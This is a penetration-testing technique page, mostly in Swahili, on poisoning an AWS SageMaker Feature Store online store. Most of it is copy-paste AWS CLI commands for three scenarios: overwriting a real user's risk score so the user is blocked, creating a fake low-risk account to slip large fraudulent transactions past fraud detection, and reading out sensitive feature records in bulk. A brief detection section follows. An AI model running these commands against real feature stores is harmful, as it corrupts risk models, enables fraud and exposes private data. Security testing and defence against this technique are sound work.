# SageMaker Feature Store online store poisoning

Tumia kwa mabaya `sagemaker:PutRecord` kwenye Feature Group yenye OnlineStore imewezeshwa ili kubadilisha (overwrite) thamani za feature zinayotumika na online inference. Ikitumika pamoja na `sagemaker:GetRecord`, mshambuliaji anaweza kusoma features nyeti na exfiltrate data ya ML ya siri. Hii haihitaji ufikiaji wa models au endpoints, na hivyo ni shambulio la moja kwa moja kwenye tabaka la data.

## Mahitaji
- Ruhusa: `sagemaker:ListFeatureGroups`, `sagemaker:DescribeFeatureGroup`, `sagemaker:PutRecord`, `sagemaker:GetRecord`
- Lengo: Feature Group yenye OnlineStore imewezeshwa (kawaida inasaidia real-time inference)
- Ugumu: **LOW** - Amri rahisi za AWS CLI, hakuna urekebishaji wa modeli unaohitajika

## Hatua

### Reconnaissance

1) Orodhesha Feature Groups zenye OnlineStore zimewezeshwa
```bash
REGION=${REGION:-us-east-1}
aws sagemaker list-feature-groups \
--region $REGION \
--query "FeatureGroupSummaries[?OnlineStoreConfig!=null].[FeatureGroupName,CreationTime]" \
--output table
```
2) Elezea Feature Group lengwa ili kuelewa schema yake
```bash
FG=<feature-group-name>
aws sagemaker describe-feature-group \
--region $REGION \
--feature-group-name "$FG"
```
Kumbuka `RecordIdentifierFeatureName`, `EventTimeFeatureName`, na definisheni zote za feature. Hizi zinahitajika ili kuunda rekodi halali.

### Senario la Shambulio 1: Uchafuzi wa Data (Kuandika tena rekodi zilizopo)

1) Soma rekodi halali ya sasa
```bash
aws sagemaker-featurestore-runtime get-record \
--region $REGION \
--feature-group-name "$FG" \
--record-identifier-value-as-string user-001
```
2) Chafua rekodi kwa thamani zenye madhara kwa kutumia parameter ya inline `--record`
```bash
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)

# Example: Change risk_score from 0.15 to 0.99 to block a legitimate user
aws sagemaker-featurestore-runtime put-record \
--region $REGION \
--feature-group-name "$FG" \
--record "[
{\"FeatureName\": \"entity_id\", \"ValueAsString\": \"user-001\"},
{\"FeatureName\": \"event_time\", \"ValueAsString\": \"$NOW\"},
{\"FeatureName\": \"risk_score\", \"ValueAsString\": \"0.99\"},
{\"FeatureName\": \"transaction_amount\", \"ValueAsString\": \"125.50\"},
{\"FeatureName\": \"account_status\", \"ValueAsString\": \"POISONED\"}
]" \
--target-stores OnlineStore
```
3) Thibitisha data iliyopotoshwa
```bash
aws sagemaker-featurestore-runtime get-record \
--region $REGION \
--feature-group-name "$FG" \
--record-identifier-value-as-string user-001
```
**Athari**: Modeli za ML zinazotumia sifa hii sasa zitaona `risk_score=0.99` kwa mtumiaji halali, na inaweza kuzizuia miamala yao au huduma zao.

### Senario ya Shambulio 2: Malicious Data Injection (Create Fraudulent Records)

Ingiza rekodi mpya kabisa zenye sifa zilizofanyiwa udanganyifu ili kuepuka udhibiti wa usalama:
```bash
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)

# Create fake user with artificially low risk to perform fraudulent transactions
aws sagemaker-featurestore-runtime put-record \
--region $REGION \
--feature-group-name "$FG" \
--record "[
{\"FeatureName\": \"entity_id\", \"ValueAsString\": \"user-999\"},
{\"FeatureName\": \"event_time\", \"ValueAsString\": \"$NOW\"},
{\"FeatureName\": \"risk_score\", \"ValueAsString\": \"0.01\"},
{\"FeatureName\": \"transaction_amount\", \"ValueAsString\": \"999999.99\"},
{\"FeatureName\": \"account_status\", \"ValueAsString\": \"approved\"}
]" \
--target-stores OnlineStore
```
Thibitisha the injection:
```bash
aws sagemaker-featurestore-runtime get-record \
--region $REGION \
--feature-group-name "$FG" \
--record-identifier-value-as-string user-999
```
**Athari**: Attacker anaunda kitambulisho bandia chenye alama ya hatari ya chini (0.01) ambacho kinaweza kufanya miamala ya udanganyifu zenye thamani kubwa bila kuamsha fraud detection.

### Senario ya Shambulio 3: Sensitive Data Exfiltration

Soma rekodi nyingi ili kutoa features za siri na kuchambua tabia ya modeli:
```bash
# Exfiltrate data for known users
for USER_ID in user-001 user-002 user-003 user-999; do
echo "Exfiltrating data for ${USER_ID}:"
aws sagemaker-featurestore-runtime get-record \
--region $REGION \
--feature-group-name "$FG" \
--record-identifier-value-as-string ${USER_ID}
done
```
**Athari**: Vipengele vya siri (alama za hatari, mifumo ya miamala, data za kibinafsi) vinafunuliwa kwa mshambuliaji.

### Kuunda Feature Group ya Mtihani/Demo (Hiari)

Iwapo unahitaji kuunda Feature Group ya mtihani:
```bash
REGION=${REGION:-us-east-1}
FG=$(aws sagemaker list-feature-groups --region $REGION --query "FeatureGroupSummaries[?OnlineStoreConfig!=null]|[0].FeatureGroupName" --output text)
if [ -z "$FG" -o "$FG" = "None" ]; then
ACC=$(aws sts get-caller-identity --query Account --output text)
FG=test-fg-$ACC-$(date +%s)
ROLE_ARN=$(aws iam get-role --role-name AmazonSageMaker-ExecutionRole --query Role.Arn --output text 2>/dev/null || echo arn:aws:iam::$ACC:role/service-role/AmazonSageMaker-ExecutionRole)

aws sagemaker create-feature-group \
--region $REGION \
--feature-group-name "$FG" \
--record-identifier-feature-name entity_id \
--event-time-feature-name event_time \
--feature-definitions "[
{\"FeatureName\":\"entity_id\",\"FeatureType\":\"String\"},
{\"FeatureName\":\"event_time\",\"FeatureType\":\"String\"},
{\"FeatureName\":\"risk_score\",\"FeatureType\":\"Fractional\"},
{\"FeatureName\":\"transaction_amount\",\"FeatureType\":\"Fractional\"},
{\"FeatureName\":\"account_status\",\"FeatureType\":\"String\"}
]" \
--online-store-config "{\"EnableOnlineStore\":true}" \
--role-arn "$ROLE_ARN"

echo "Waiting for feature group to be in Created state..."
for i in $(seq 1 40); do
ST=$(aws sagemaker describe-feature-group --region $REGION --feature-group-name "$FG" --query FeatureGroupStatus --output text || true)
echo "$ST"; [ "$ST" = "Created" ] && break; sleep 15
done
fi

echo "Feature Group ready: $FG"
```
## Ugunduzi

Fuatilia CloudTrail kwa mifumo ya kutatanisha:
- `PutRecord` events from unusual IAM principals or IP addresses
- Wito wa juu wa `PutRecord` au `GetRecord`
- `PutRecord` with anomalous feature values (e.g., `risk_score` outside normal range)
- Operesheni kubwa za `GetRecord` zinazoonyesha mass exfiltration
- Ufikiaji nje ya saa za kawaida za kazi au kutoka maeneo yasiyotegemewa

Tekeleza ugunduzi wa anomalia:
- Uthibitishaji wa thamani za feature (e.g., `risk_score` must be 0.0-1.0)
- Uchambuzi wa mifumo ya uandishi (frequency, timing, source identity)
- Ugunduzi wa mabadiliko ya data (sudden changes in feature distributions)

## Marejeo
- [AWS SageMaker Feature Store Documentation](https://docs.aws.amazon.com/sagemaker/latest/dg/feature-store.html)
- [Feature Store Security Best Practices](https://docs.aws.amazon.com/sagemaker/latest/dg/feature-store-security.html)
